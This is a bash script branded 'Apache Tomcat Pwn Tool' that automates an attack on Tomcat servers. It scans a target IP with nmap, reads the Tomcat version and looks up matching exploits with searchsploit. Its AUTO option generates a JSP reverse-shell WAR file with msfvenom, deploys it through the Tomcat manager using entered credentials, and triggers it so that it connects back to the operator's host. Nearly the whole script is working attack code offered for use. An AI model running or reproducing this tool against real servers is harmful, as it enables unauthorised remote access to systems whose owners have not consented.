#!/bin/bash

purple='\033[1;35m'
red='\033[33;31m'
green='\033[33;32m'
blue='\033[33;34m'
white='\033[1;37m'

echo -ne "$purple
    ┏━━━┓━━━━━━━━━━━━━┏┓━━━━━━━━━━┏━━━━┓━━━━━━━━━━━━━━━━━━┏┓━━━━━┏━━━┓━━━━━━━━━━┏━━━━┓━━━━━━━━┏┓━
    ┃┏━┓┃━━━━━━━━━━━━━┃┃━━━━━━━━━━┃┏┓┏┓┃━━━━━━━━━━━━━━━━━┏┛┗┓━━━━┃┏━┓┃━━━━━━━━━━┃┏┓┏┓┃━━━━━━━━┃┃━
    ┃┃━┃┃┏━━┓┏━━┓━┏━━┓┃┗━┓┏━━┓━━━━┗┛┃┃┗┛┏━━┓┏┓┏┓┏━━┓┏━━┓━┗┓┏┛━━━━┃┗━┛┃┏┓┏┓┏┓┏━┓━┗┛┃┃┗┛┏━━┓┏━━┓┃┃━
    ┃┗━┛┃┃┏┓┃┗━┓┃━┃┏━┛┃┏┓┃┃┏┓┃━━━━━━┃┃━━┃┏┓┃┃┗┛┃┃┏━┛┗━┓┃━━┃┃━━━━━┃┏━━┛┃┗┛┗┛┃┃┏┓┓━━┃┃━━┃┏┓┃┃┏┓┃┃┃━
    ┃┏━┓┃┃┗┛┃┃┗┛┗┓┃┗━┓┃┃┃┃┃┃━┫━━━━━┏┛┗┓━┃┗┛┃┃┃┃┃┃┗━┓┃┗┛┗┓━┃┗┓━━━━┃┃━━━┗┓┏┓┏┛┃┃┃┃━┏┛┗┓━┃┗┛┃┃┗┛┃┃┗┓
    ┗┛━┗┛┃┏━┛┗━━━┛┗━━┛┗┛┗┛┗━━┛━━━━━┗━━┛━┗━━┛┗┻┻┛┗━━┛┗━━━┛━┗━┛━━━━┗┛━━━━┗┛┗┛━┗┛┗┛━┗━━┛━┗━━┛┗━━┛┗━┛
    ━━━━━┃┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ━━━━━┗┛━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"

echo -e "$red
                                    ██▄ ▀▄▀   █▄█ █▀█ █▀▄ █ █
                                    █▄█  █    █ █ █▄█ █▀▄ ▀▄█
"

### Check Programs
echo -ne "$green
    ═════════════════════════════════════════════════════════════════════════════════════════════
    [*] Programs:
    [*] Curl - $(command -v curl >/dev/null 2>&1 && echo "Installed!" || echo "Not Installed!")
    [*] Nmap - $(command -v nmap >/dev/null 2>&1 && echo "Installed!" || echo "Not Installed!")
    [*] Msfvenom - $(command -v msfvenom >/dev/null 2>&1 && echo "Installed!" || echo "Not Installed!")
    [*] Msfconsole - $(command -v msfconsole >/dev/null 2>&1 && echo "Installed!" || echo "Not Installed!")
    [*] Searchsploit - $(command -v searchsploit >/dev/null 2>&1 && echo "Installed!" || echo "Not Installed!")
    ═════════════════════════════════════════════════════════════════════════════════════════════
\n"


### Target
echo -ne "$white"

read -p "    [*] Target IP: " ip


### Ports
test_one=$(nmap -sVC -Pn -p8009 $ip | grep "8009 *")
test_two=$(nmap -sVC -Pn -p8080 $ip | grep "8080 *")


### Site Up or Down
curl -s -o /dev/null http://$ip:8080 --connect-timeout 2

res=$?

if [ $res -ne 0 ] ; then
   echo -e "$red    [!] Target Down"
   exit 1
fi

if [ $(curl -s -o /dev/null -I -w "%{http_code}" http://$ip:8080 | cut -d'%' -f1) != 200 ] ; then
   echo -e "$red [!] Target Down"
   exit 1
else
   echo -e "$green    [!] Target Up"
fi


### Apache Tomcat Version
tomver=$(curl -s http://$ip:8080/docs/ | grep -Eo "Version ([0-9]{1,3}[\.]){2}[0-9]{1,3}" | cut -d' ' -f2)
ajpver=$(echo $test_one | awk {\print\$3} | cut -c 1,2,3)

echo -e "    [!] Version: Apache Tomcat $tomver"

echo -ne "$green
    ═════════════════════════════════════════════════════════════════════════════════════════════
    [*] Ports Status:
    [x] $test_one
    [x] $test_two   
    ═════════════════════════════════════════════════════════════════════════════════════════════
\n"

#Search a exploit
exploits=$(searchsploit Apache Tomcat $tomver && searchsploit $ajpver)

echo -ne "
$exploits
\n"


#Choose the way
echo "   ~ Choose one option ~"
PS3='   Option: '
type=(
"AUTO"
"MANUAL"
"EXIT"
"REPORT FILE"
)
select var in "${type[@]}"; do
 case $var in

"AUTO")
#Create reverse shell
echo -e "$white    [*] Create .war reverse shell!"
read -p "    [*] My IP: " myip
read -p "    [*] Listening Port: " myport
echo -e "    [!] Set Netcat to listening: 'nc -lvnp $myport'"

msfvenom -p java/jsp_shell_reverse_tcp LHOST=$myip LPORT=$myport -f war > shell.war


#Upload the .war shell
echo -ne "$green   
      Upload the .war shell file!
          Tomcat Credentials:
"
echo -e "$white"
read -p "   [*] User: " user
read -p "   [*] Password: " pass

echo -e "$blue   [*] Uploading..."
curl --upload-file ./shell.war -u "$user:$pass" "http://$ip:8080/manager/text/deploy?path=/warshell"


#Execute the payload to get a reverse shell
echo -e "$white   [*] Execute the payload!"

curl -u "$user:$pass" "http://$ip:8080/warshell/"

echo -e "$green   [*] Successed!"

rm shell.war

echo "   [*] Removed the .war shell file!"

echo -e "$white"
     ;;
"MANUAL")
msfconsole -q -x "search Apache Tomcat"
     ;;
"EXIT")
    exit
     ;;
"REPORT FILE")
echo -e "$green
      [*] Your report file
      [?] Set path + report name
      [?] Ex: /tmp/apt-report.txt"
echo -e "$white"
read -p "      [*] Local to save: " save

echo -e "
    _  _                ___                   _     _          
   |_||_) _  _ |_  _     |  _ __  _  _ _|_   |_) _ |_) _   __|_
   | ||  (_|(_ | |(/_    | (_)|||(_ (_| |_   | \(/_|  (_) |  |_


   [1] IP: $ip
   [2] TOMCAT VERSION: $tomver
   [3] STATUS PORTS:
   (*) $test_one
   (*) $test_two  
   [4] Exploits: 
   $exploits

" > $save
     ;;
   esac
done
